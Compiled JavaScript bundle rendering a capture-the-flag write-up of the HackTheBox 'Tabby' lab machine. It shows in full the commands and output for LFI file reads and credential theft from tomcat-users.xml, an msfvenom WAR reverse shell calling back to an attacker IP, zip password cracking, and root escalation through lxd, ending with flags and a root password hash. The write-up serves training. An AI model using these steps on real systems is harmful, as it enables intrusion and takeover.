"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[642],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),u=p(n),h=o,d=u["".concat(l,".").concat(h)]||u[h]||m[h]||r;return n?a.createElement(d,i(i({ref:t},c),{},{components:n})):a.createElement(d,i({ref:t},c))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,i=new Array(r);i[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:o,i[1]=s;for(var p=2;p<r;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},48084:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>r,metadata:()=>s,toc:()=>p});var a=n(87462),o=(n(67294),n(3905));const r={layout:"post",title:"Tabby ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","lfi","tomcat"],date:"2020/11/07 17:30:00",thumbnail:"/img/HackTheBox/tabby.png",toc:!0},i="Information",s={unversionedId:"HackTheBox/Tabby/write-up",id:"HackTheBox/Tabby/write-up",title:"Tabby ",description:"- Name: Tabby",source:"@site/writeups/HackTheBox/Tabby/write-up.md",sourceDirName:"HackTheBox/Tabby",slug:"/HackTheBox/Tabby/write-up",permalink:"/writeups/HackTheBox/Tabby/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"php",permalink:"/writeups/tags/php"},{label:"lfi",permalink:"/writeups/tags/lfi"},{label:"tomcat",permalink:"/writeups/tags/tomcat"}],version:"current",frontMatter:{layout:"post",title:"Tabby ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","lfi","tomcat"],date:"2020/11/07 17:30:00",thumbnail:"/img/HackTheBox/tabby.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"SneakyMailer ",permalink:"/writeups/HackTheBox/SneakyMailer/write-up"},next:{title:"Tenet ",permalink:"/writeups/HackTheBox/Tenet/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"HTTP exploitation: LFI",id:"http-exploitation-lfi",level:2},{value:"HTTP exploitation: File upload &amp; RCE",id:"http-exploitation-file-upload--rce",level:2},{value:"System enumeration",id:"system-enumeration",level:2},{value:"Privilege Escalation of Machine : tomcat to ash",id:"privilege-escalation-of-machine--tomcat-to-ash",level:2},{value:"Privilege Escalation of Machine : ash to root",id:"privilege-escalation-of-machine--ash-to-root",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...r}=e;return(0,o.kt)(u,(0,a.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"information"},"Information"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Name:")," Tabby"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Profile:")," ",(0,o.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/259"},"www.hackthebox.eu")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"Tabby",src:n(41120).Z,width:"598",height:"381"})),(0,o.kt)("h2",{id:"overview"},"Overview"),(0,o.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip\n")),(0,o.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,o.kt)("p",null,"Port and service discovery scan with ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Sat Aug  8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194\nIncreasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase.\nNmap scan report for 10.10.10.194\nHost is up (0.032s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Mega Hosting\n8080/tcp open  http    Apache Tomcat\n| http-methods:\n|_  Supported Methods: OPTIONS GET HEAD POST\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Apache Tomcat\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sat Aug  8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds\n")),(0,o.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,o.kt)("p",null,"Let's start with the website on port 80 and do a bunch of directory busting\nwith ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.194/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.194/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .html .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\nindex.php               [Status: 200, Size: 14175, Words: 2135, Lines: 374]\nnews.php                [Status: 200, Size: 0, Words: 1, Lines: 1]\n.                       [Status: 200, Size: 14175, Words: 2135, Lines: 374]\n:: Progress: [153068/153068] :: Job [1/1] :: 773 req/sec :: Duration: [0:03:18] :: Errors: 0 ::\n")),(0,o.kt)("p",null,"Let's try to do something with ",(0,o.kt)("inlineCode",{parentName:"p"},"news.php"),"."),(0,o.kt)("p",null,"If we check the menu on the main page, we can see that ",(0,o.kt)("inlineCode",{parentName:"p"},"NEWS")," have the following\nlink: ",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb/news.php?file=statement"},"http://megahosting.htb/news.php?file=statement")),(0,o.kt)("p",null,"Let's add the local domain entries:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cat /etc/hosts| grep 194\n10.10.10.194 tabby.htb\n10.10.10.194 megahosting.htb\n")),(0,o.kt)("p",null,"The link does look like LFI vulnerable."),(0,o.kt)("h2",{id:"http-exploitation-lfi"},"HTTP exploitation: LFI"),(0,o.kt)("p",null,"Let's confirm the LFI:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ curl http://megahosting.htb/news.php\\?file\\=../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\ntomcat:x:997:997::/opt/tomcat:/bin/false\nmysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false\nash:x:1000:1000:clive:/home/ash:/bin/bash\n")),(0,o.kt)("p",null,"We can also read the source code of this page:\n",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb/news.php?file=../news.php"},"http://megahosting.htb/news.php?file=../news.php")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n$file = $_GET[\'file\'];\n$fh = fopen("files/$file","r");\nwhile ($line = fgets($fh)) {\n  echo($line);\n}\nfclose($fh);\n?>\n')),(0,o.kt)("p",null,"Let's try to access the tomcat manager of the Tomcat server on prot 8080:\n",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.194:8080/manager/html"},"http://10.10.10.194:8080/manager/html")),(0,o.kt)("p",null,"No luck with default credentials, but since we have a LFI we may try to read\nthe configuration file."),(0,o.kt)("p",null,"Let's check on which OS we are before."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ curl \'http://megahosting.htb/news.php?file=../../../../../../../etc/os-release\'\nNAME="Ubuntu"\nVERSION="20.04 LTS (Focal Fossa)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 20.04 LTS"\nVERSION_ID="20.04"\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"\nPRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"\nVERSION_CODENAME=focal\nUBUNTU_CODENAME=focal\n')),(0,o.kt)("p",null,"If we search the tomcat package for Ubuntu focal (20.04) we find it's in\n",(0,o.kt)("a",{parentName:"p",href:"https://packages.ubuntu.com/search?keywords=tomcat&searchon=names&suite=focal&section=all"},"version 9"),"."),(0,o.kt)("p",null,"PS: ",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb:8080/"},"http://megahosting.htb:8080/")," also discloses the tomcat version."),(0,o.kt)("p",null,"The config file storing the manager credentials is\n",(0,o.kt)("inlineCode",{parentName:"p"},"$CATALINA_HOME/conf/tomcat-users.xml"),"."),(0,o.kt)("p",null,"On Ubuntu ",(0,o.kt)("inlineCode",{parentName:"p"},"$CATALINA_HOME")," = ",(0,o.kt)("inlineCode",{parentName:"p"},"/usr/share/tomcat{x}")," where ",(0,o.kt)("inlineCode",{parentName:"p"},"{x}")," is the version\nof tomcat eg. 7, 8, 9, etc. Also the config folder is ",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/tomcat{x}"),"."),(0,o.kt)("p",null,"But ",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/tomcat{x}")," may be for older versions only."),(0,o.kt)("p",null,"Let's check the files list for ",(0,o.kt)("inlineCode",{parentName:"p"},"tomcat9")," for ubuntu:\n",(0,o.kt)("a",{parentName:"p",href:"https://packages.ubuntu.com/focal/all/tomcat9/filelist"},"https://packages.ubuntu.com/focal/all/tomcat9/filelist")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/etc/cron.daily/tomcat9\n/etc/rsyslog.d/tomcat9.conf\n/etc/tomcat9/policy.d/01system.policy\n/etc/tomcat9/policy.d/02debian.policy\n/etc/tomcat9/policy.d/03catalina.policy\n/etc/tomcat9/policy.d/04webapps.policy\n/etc/tomcat9/policy.d/50local.policy\n/lib/systemd/system/tomcat9.service\n/usr/lib/sysusers.d/tomcat9.conf\n/usr/lib/tmpfiles.d/tomcat9.conf\n/usr/libexec/tomcat9/tomcat-start.sh\n/usr/libexec/tomcat9/tomcat-update-policy.sh\n/usr/share/doc/tomcat9/README.Debian\n/usr/share/doc/tomcat9/changelog.Debian.gz\n/usr/share/doc/tomcat9/copyright\n/usr/share/tomcat9-root/default_root/META-INF/context.xml\n/usr/share/tomcat9-root/default_root/index.html\n/usr/share/tomcat9/default.template\n/usr/share/tomcat9/etc/catalina.properties\n/usr/share/tomcat9/etc/context.xml\n/usr/share/tomcat9/etc/jaspic-providers.xml\n/usr/share/tomcat9/etc/logging.properties\n/usr/share/tomcat9/etc/server.xml\n/usr/share/tomcat9/etc/tomcat-users.xml\n/usr/share/tomcat9/etc/web.xml\n/usr/share/tomcat9/logrotate.template\n/var/lib/tomcat9/conf\n/var/lib/tomcat9/logs\n/var/lib/tomcat9/work\n")),(0,o.kt)("p",null,"So it's seems ubuntu mapped the files differently than the apache defaults,\nso it won't be ",(0,o.kt)("inlineCode",{parentName:"p"},"$TOMCAT_HOME/conf/tomcat-users.xml")," but\n",(0,o.kt)("inlineCode",{parentName:"p"},"$TOMCAT_HOME/etc/tomcat-users.xml"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'$ curl \'http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml\'\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!--\n  Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the "License"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an "AS IS" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n--\x3e\n<tomcat-users xmlns="http://tomcat.apache.org/xml"\n              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"\n              version="1.0">\n\x3c!--\n  NOTE:  By default, no user is included in the "manager-gui" role required\n  to operate the "/manager/html" web application.  If you wish to use this app,\n  you must define such a user - the username and password are arbitrary. It is\n  strongly recommended that you do NOT use one of the users in the commented out\n  section below since they are intended for use with the examples web\n  application.\n--\x3e\n\x3c!--\n  NOTE:  The sample user and role entries below are intended for use with the\n  examples web application. They are wrapped in a comment and thus are ignored\n  when reading this file. If you wish to configure these users for use with the\n  examples web application, do not forget to remove the <!.. ..> that surrounds\n  them. You will also need to set the passwords to something appropriate.\n--\x3e\n\x3c!--\n  <role rolename="tomcat"/>\n  <role rolename="role1"/>\n  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>\n  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>\n  <user username="role1" password="<must-be-changed>" roles="role1"/>\n--\x3e\n   <role rolename="admin-gui"/>\n   <role rolename="manager-script"/>\n   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>\n</tomcat-users>\n')),(0,o.kt)("p",null,"We can connect with ",(0,o.kt)("inlineCode",{parentName:"p"},"tomcat")," / ",(0,o.kt)("inlineCode",{parentName:"p"},"$3cureP4s5w0rd123!")," to ",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb:8080/manager/html"},"http://megahosting.htb:8080/manager/html")),(0,o.kt)("p",null,"The manager interface seems to be enabled only on localhost but we may\nupload files without it."),(0,o.kt)("p",null,"We can download ",(0,o.kt)("inlineCode",{parentName:"p"},"server.xml"),"\n",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml"},"http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'...\n      <Host name="localhost"  appBase="webapps"\n            unpackWARs="true" autoDeploy="true">\n...\n')),(0,o.kt)("p",null,"So it's accessible only from localhost but will unpack WARs and auto deploy\nthem."),(0,o.kt)("p",null,"By reading ",(0,o.kt)("inlineCode",{parentName:"p"},"web.xml")," we can see that ",(0,o.kt)("inlineCode",{parentName:"p"},".jsp")," are allowed."),(0,o.kt)("p",null,"Now it's time to read documentation!"),(0,o.kt)("h2",{id:"http-exploitation-file-upload--rce"},"HTTP exploitation: File upload & RCE"),(0,o.kt)("p",null,"Let's see the ",(0,o.kt)("a",{parentName:"p",href:"https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands"},"Supported Manager Commands"),"."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"All commands that the Manager application knows how to process are specified in a single request URI like this:"),(0,o.kt)("p",{parentName:"blockquote"},(0,o.kt)("inlineCode",{parentName:"p"},"http://{host}:{port}/manager/text/{command}?{parameters}")),(0,o.kt)("p",{parentName:"blockquote"},"where {host} and {port} represent the hostname and port number on which Tomcat is running, {command} represents the Manager command you wish to execute, and {parameters} represents the query parameters that are specific to that command. In the illustrations below, customize the host and port appropriately for your installation."),(0,o.kt)("p",{parentName:"blockquote"},"The commands are usually executed by HTTP GET requests. The /deploy command has a form that is executed by an HTTP PUT request.")),(0,o.kt)("p",null,"Then we can read ",(0,o.kt)("strong",{parentName:"p"},"Deploy A New Application Archive (WAR) Remotely"),"."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},(0,o.kt)("inlineCode",{parentName:"p"},"http://localhost:8080/manager/text/deploy?path=/foo")),(0,o.kt)("p",{parentName:"blockquote"},"Upload the web application archive (WAR) file that is specified as the request data in this HTTP PUT request, install it into the appBase directory of our corresponding virtual host, and start, deriving the name for the WAR file added to the appBase from the specified path. The application can later be undeployed (and the corresponding WAR file removed) by use of the /undeploy command."),(0,o.kt)("p",{parentName:"blockquote"},"This command is executed by an HTTP PUT request.")),(0,o.kt)("p",null,"Let's craft a WAR reverse shell."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ msfvenom --list payloads | grep -i jsp\n    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell\n    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell\n\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.49 LPORT=9999 -f war > revshell.war\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ curl -X PUT -u 'tomcat':'$3cureP4s5w0rd123!' -T revshell.war 'http://tabby.htb:8080/manager/text/deploy?path=/cyfun'\nOK - Deployed application at context path [/cyfun]\n")),(0,o.kt)("p",null,"Now the ",(0,o.kt)("a",{parentName:"p",href:"http://megahosting.htb:8080/cyfun/"},"http://megahosting.htb:8080/cyfun/"),"."),(0,o.kt)("p",null,"Let's start a listener with ",(0,o.kt)("a",{parentName:"p",href:"https://pwncat.org/"},"pwncat"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.194:39776 (family 2/IPv4, TCP)\nid\nuid=997(tomcat) gid=997(tomcat) groups=997(tomcat)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ntomcat@tabby:/var/lib/tomcat9$\n")),(0,o.kt)("h2",{id:"system-enumeration"},"System enumeration"),(0,o.kt)("p",null,"With ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/carlospolop/PEASS-ng"},"linpeas")," we can find a backup file:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"[+] Backup files?\n-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"tomcat@tabby:/var/www/html$ ls\nls\nassets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt\ntomcat@tabby:/var/www/html$ ls -lhA files\nls -lhA files\ntotal 28K\n-rw-r--r-- 1 ash  ash  8.6K Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive\ndrwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs\n-rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement\n")),(0,o.kt)("p",null,"It password protected, lets' crack it with ",(0,o.kt)("inlineCode",{parentName:"p"},"fcrackzip"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ fcrackzip -D -p /usr/share/wordlists/password/rockyou.txt files/16162020_backup.zip\npossible pw found: admin@it ()\n\n$ unzip 16162020_backup.zip\nArchive:  16162020_backup.zip\n   creating: var/www/html/assets/\n[16162020_backup.zip] var/www/html/favicon.ico password:\n  inflating: var/www/html/favicon.ico\n   creating: var/www/html/files/\n  inflating: var/www/html/index.php\n extracting: var/www/html/logo.png\n  inflating: var/www/html/news.php\n  inflating: var/www/html/Readme.txt\n")),(0,o.kt)("h2",{id:"privilege-escalation-of-machine--tomcat-to-ash"},"Privilege Escalation of Machine : tomcat to ash"),(0,o.kt)("p",null,"Since the backup file was owned by ash we can try to re-use the archive password\nfor ash account:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"tomcat@tabby:/var/lib/tomcat9$ su ash\nPassword: admin@it\n\nash@tabby:/var/lib/tomcat9$\n\nash@tabby:~$ cat user.txt\n13a5665425216a6a5a14fbd8aab23b93\n")),(0,o.kt)("h2",{id:"privilege-escalation-of-machine--ash-to-root"},"Privilege Escalation of Machine : ash to root"),(0,o.kt)("p",null,"ash is in adm and lxd groups:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"ash@tabby:~$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation"},"lxc - Privilege escalation")),(0,o.kt)("p",null,"Prepare distrobuilder:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo pacman -S go debootstrap rsync gnupg squashfs-tools git --needed\n$ go get -d -v github.com/lxc/distrobuilder/distrobuilder\n$ cd $HOME/go/src/github.com/lxc/distrobuilder\n$ make\n$ cd\n")),(0,o.kt)("p",null,"Prepare and build an image:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ mkdir -p $HOME/ContainerImages/alpine/\n$ cd $HOME/ContainerImages/alpine/\n$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml\n$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml\n\n# or\n\n$ mkdir -p $HOME/ContainerImages/voidlinux/\n$ cd $HOME/ContainerImages/voidlinux/\n$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/voidlinux.yaml\n$ sudo $HOME/go/bin/distrobuilder build-lxd voidlinux.yaml\n")),(0,o.kt)("p",null,"Then, upload to the server the files ",(0,o.kt)("inlineCode",{parentName:"p"},"lxd.tar.xz")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"rootfs.squashfs"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ruby -run -e httpd . -p 8888\n[2020-08-09 15:40:46] INFO  WEBrick 1.6.0\n[2020-08-09 15:40:46] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]\n[2020-08-09 15:40:46] INFO  WEBrick::HTTPServer#start: pid=43919 port=8888\n")),(0,o.kt)("p",null,"Then on the target download & add the image:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ wget http://10.10.14.76:8888/lxd.tar.xz\n$ wget http://10.10.14.76:8888/rootfs.squashfs\n$ lxc image import lxd.tar.xz rootfs.squashfs --alias voidlinux\n$ lxc image list\n")),(0,o.kt)("p",null,"Create a container and add root path:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ lxc init voidlinux cyfun -c security.privileged=true\n$ lxc list\n$ lxc config device add cyfun host-root disk source=/ path=/mnt/root recursive=true\n")),(0,o.kt)("p",null,"Execute the container:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ lxc start cyfun\n$ lxc exec cyfun /bin/sh\n$ cd /mnt/root\n")),(0,o.kt)("p",null,"Loot:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# cat /mnt/root/root/root.txt\n3b89a121fa4338f7835fedb1f62b8cdc\n# cat /mnt/root/etc/shadow | grep root\nroot:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::\n")))}m.isMDXComponent=!0},41120:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/tabby-a502b95c3d4c2ffe0dcaa0d68180514c.png"}}]);